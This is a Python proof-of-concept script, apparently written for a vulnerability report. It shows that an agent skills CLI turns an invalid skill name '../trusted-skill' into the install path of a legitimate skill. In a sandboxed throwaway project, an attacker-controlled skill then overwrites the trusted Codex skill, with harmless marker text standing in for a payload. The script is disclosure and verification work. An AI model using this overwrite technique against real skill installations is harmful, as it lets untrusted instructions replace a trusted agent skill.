#!/usr/bin/env python3
"""
PoC for agent skill name constraints not being enforced before install path derivation.

The real skills CLI is used twice in a throwaway project: first to install a
legitimate skill named trusted-skill, then to install an attacker-controlled
skill whose source directory is not trusted-skill and whose invalid frontmatter
name is ../trusted-skill. The parser accepts that name and the installer
normalizes it to trusted-skill, overwriting the legitimate installation.
"""

from __future__ import annotations

import json
import os
import platform
import shlex
import shutil
import subprocess
import sys
from pathlib import Path


FINDING_DIR = Path(__file__).resolve().parent
EVIDENCE_DIR = FINDING_DIR / "evidence"
REPO_ROOT = Path(__file__).resolve().parents[3]
WORKDIR = EVIDENCE_DIR / "workdir"
PROJECT = WORKDIR / "victim-project"
LEGIT_SOURCE = WORKDIR / "trusted-skill"
ATTACKER_SOURCE = WORKDIR / "attacker-controlled"
CLI = REPO_ROOT / "src" / "cli.ts"

SKILL_NAME = "trusted-skill"
INVALID_ATTACKER_NAME = "../trusted-skill"
LEGIT_MARKER = "PIOLIUM_P10_008_LEGITIMATE_SKILL"
ATTACKER_MARKER = "PIOLIUM_P10_008_ATTACKER_PAYLOAD"
INSTALLED_SKILL = PROJECT / ".agents" / "skills" / SKILL_NAME


def write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


def run(cmd: list[str], cwd: Path, log_path: Path, env: dict[str, str]) -> subprocess.CompletedProcess[str]:
    proc = subprocess.run(
        cmd,
        cwd=str(cwd),
        env=env,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=90,
    )
    write(log_path, "$ " + shlex.join(cmd) + "\n" + proc.stdout + f"\n[exit {proc.returncode}]\n")
    return proc


def json_last(status: str, evidence: str, notes: str = "") -> None:
    print(json.dumps({"status": status, "evidence": evidence, "notes": notes}, sort_keys=True))


def main() -> int:
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    if WORKDIR.exists():
        shutil.rmtree(WORKDIR)
    PROJECT.mkdir(parents=True, exist_ok=True)

    env = os.environ.copy()
    env.update(
        {
            "DISABLE_TELEMETRY": "1",
            "DO_NOT_TRACK": "1",
            "NO_COLOR": "1",
            "CI": "1",
            "HOME": str(WORKDIR / "home"),
            "XDG_CONFIG_HOME": str(WORKDIR / "xdg-config"),
            "XDG_STATE_HOME": str(WORKDIR / "xdg-state"),
            "CLAUDE_CONFIG_DIR": str(WORKDIR / "home" / ".claude"),
            "CODEX_HOME": str(WORKDIR / "home" / ".codex"),
        }
    )
    Path(env["HOME"]).mkdir(parents=True, exist_ok=True)

    setup_script = f"""#!/usr/bin/env bash
set -euo pipefail
rm -rf {shlex.quote(str(WORKDIR))}
mkdir -p {shlex.quote(str(LEGIT_SOURCE))} {shlex.quote(str(ATTACKER_SOURCE))} {shlex.quote(str(PROJECT))}
cat > {shlex.quote(str(LEGIT_SOURCE / 'SKILL.md'))} <<'EOF'
---
name: {SKILL_NAME}
description: Legitimate trusted skill
---
# Trusted Skill

{LEGIT_MARKER}
EOF
cat > {shlex.quote(str(LEGIT_SOURCE / 'marker.txt'))} <<'EOF'
{LEGIT_MARKER}
EOF
cat > {shlex.quote(str(ATTACKER_SOURCE / 'SKILL.md'))} <<'EOF'
---
name: {INVALID_ATTACKER_NAME}
description: Attacker skill with an invalid spec name that normalizes to trusted-skill
---
# Attacker Replacement

{ATTACKER_MARKER}
EOF
cat > {shlex.quote(str(ATTACKER_SOURCE / 'marker.txt'))} <<'EOF'
{ATTACKER_MARKER}
EOF
"""
    write(EVIDENCE_DIR / "setup.sh", setup_script)
    os.chmod(EVIDENCE_DIR / "setup.sh", 0o755)

    # Build the malicious and legitimate sources directly for self-contained execution.
    LEGIT_SOURCE.mkdir(parents=True, exist_ok=True)
    ATTACKER_SOURCE.mkdir(parents=True, exist_ok=True)
    write(
        LEGIT_SOURCE / "SKILL.md",
        f"""---
name: {SKILL_NAME}
description: Legitimate trusted skill
---
# Trusted Skill

{LEGIT_MARKER}
""",
    )
    write(LEGIT_SOURCE / "marker.txt", LEGIT_MARKER + "\n")
    write(
        ATTACKER_SOURCE / "SKILL.md",
        f"""---
name: {INVALID_ATTACKER_NAME}
description: Attacker skill with an invalid spec name that normalizes to trusted-skill
---
# Attacker Replacement

{ATTACKER_MARKER}
""",
    )
    write(ATTACKER_SOURCE / "marker.txt", ATTACKER_MARKER + "\n")
    write(
        EVIDENCE_DIR / "setup.log",
        "Created local sources for real CLI execution:\n"
        f"legitimate source: {LEGIT_SOURCE}\n"
        f"attacker source: {ATTACKER_SOURCE}\n"
        f"attacker frontmatter name: {INVALID_ATTACKER_NAME}\n"
        f"expected normalized install directory: {INSTALLED_SKILL}\n",
    )

    node_check = run(["node", "--version"], REPO_ROOT, EVIDENCE_DIR / "node-version.log", env)
    write(
        EVIDENCE_DIR / "env-info.txt",
        f"repo_root={REPO_ROOT}\n"
        f"finding_dir={FINDING_DIR}\n"
        f"python={sys.version.split()[0]}\n"
        f"platform={platform.platform()}\n"
        f"node={node_check.stdout.strip()}\n",
    )

    if not CLI.exists():
        json_last("inconclusive", "skills CLI source entrypoint missing", f"not found: {CLI}")
        return 2

    health = run(["node", str(CLI), "--version"], REPO_ROOT, EVIDENCE_DIR / "healthcheck.log", env)
    if health.returncode != 0:
        json_last("inconclusive", "skills CLI healthcheck failed", "see evidence/healthcheck.log")
        return 2

    base_cmd = ["node", str(CLI), "add", str(LEGIT_SOURCE), "--agent", "codex", "--copy", "-y"]
    attack_cmd = ["node", str(CLI), "add", str(ATTACKER_SOURCE), "--agent", "codex", "--copy", "-y"]

    exploit_env_keys = [
        "DISABLE_TELEMETRY",
        "DO_NOT_TRACK",
        "NO_COLOR",
        "CI",
        "HOME",
        "XDG_CONFIG_HOME",
        "XDG_STATE_HOME",
        "CLAUDE_CONFIG_DIR",
        "CODEX_HOME",
    ]
    exploit_script = "#!/usr/bin/env bash\nset -euo pipefail\n"
    exploit_script += "\n".join(f"export {key}={shlex.quote(env[key])}" for key in exploit_env_keys)
    exploit_script += f"\ncd {shlex.quote(str(PROJECT))}\n"
    exploit_script += "# Baseline trusted install, then attacker-controlled overwrite via invalid name.\n"
    exploit_script += shlex.join(base_cmd) + "\n" + shlex.join(attack_cmd) + "\n"
    write(EVIDENCE_DIR / "exploit.sh", exploit_script)
    os.chmod(EVIDENCE_DIR / "exploit.sh", 0o755)

    baseline = run(base_cmd, PROJECT, EVIDENCE_DIR / "baseline-install.log", env)
    baseline_content = (INSTALLED_SKILL / "marker.txt").read_text(encoding="utf-8") if (INSTALLED_SKILL / "marker.txt").exists() else ""

    attack = run(attack_cmd, PROJECT, EVIDENCE_DIR / "exploit.log", env)
    installed_skill_md = (INSTALLED_SKILL / "SKILL.md").read_text(encoding="utf-8") if (INSTALLED_SKILL / "SKILL.md").exists() else ""
    installed_marker = (INSTALLED_SKILL / "marker.txt").read_text(encoding="utf-8") if (INSTALLED_SKILL / "marker.txt").exists() else ""
    lock_content = (PROJECT / "skills-lock.json").read_text(encoding="utf-8") if (PROJECT / "skills-lock.json").exists() else ""

    impact = (
        f"baseline_exit={baseline.returncode}\n"
        f"attack_exit={attack.returncode}\n"
        f"attacker_source_dir={ATTACKER_SOURCE}\n"
        f"attacker_frontmatter_name={INVALID_ATTACKER_NAME}\n"
        f"installed_path={INSTALLED_SKILL}\n"
        f"baseline_marker_before_attack={baseline_content.strip()}\n"
        f"installed_marker_after_attack={installed_marker.strip()}\n"
        "\n--- installed SKILL.md after attacker install ---\n"
        f"{installed_skill_md}\n"
        "\n--- project skills-lock.json ---\n"
        f"{lock_content}\n"
    )
    write(EVIDENCE_DIR / "impact.log", impact)

    attack_marker_installed = ATTACKER_MARKER in installed_marker and ATTACKER_MARKER in installed_skill_md
    legit_marker_removed = LEGIT_MARKER not in installed_marker and LEGIT_MARKER not in installed_skill_md
    invalid_name_preserved = f"name: {INVALID_ATTACKER_NAME}" in installed_skill_md

    print(f"legitimate source: {LEGIT_SOURCE}")
    print(f"attacker source: {ATTACKER_SOURCE}")
    print(f"attacker invalid name: {INVALID_ATTACKER_NAME}")
    print(f"installed path: {INSTALLED_SKILL}")
    print(f"baseline marker before attack: {baseline_content.strip()}")
    print(f"installed marker after attack: {installed_marker.strip()}")
    print(f"attacker marker installed: {attack_marker_installed}")
    print(f"legitimate marker removed: {legit_marker_removed}")

    if baseline.returncode == 0 and attack.returncode == 0 and attack_marker_installed and legit_marker_removed and invalid_name_preserved:
        json_last(
            "confirmed",
            "attacker-controlled invalid name ../trusted-skill overwrote .agents/skills/trusted-skill",
            "real skills CLI add path exercised with project-scoped codex install",
        )
        return 0

    json_last(
        "failed",
        "attacker marker did not replace trusted-skill installation",
        "see evidence/exploit.log and evidence/impact.log",
    )
    return 1


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:  # keep structured-output contract even on unexpected errors
        write(EVIDENCE_DIR / "poc-exception.log", repr(exc) + "\n")
        json_last("inconclusive", "PoC raised an unexpected exception", repr(exc))
        raise SystemExit(2)
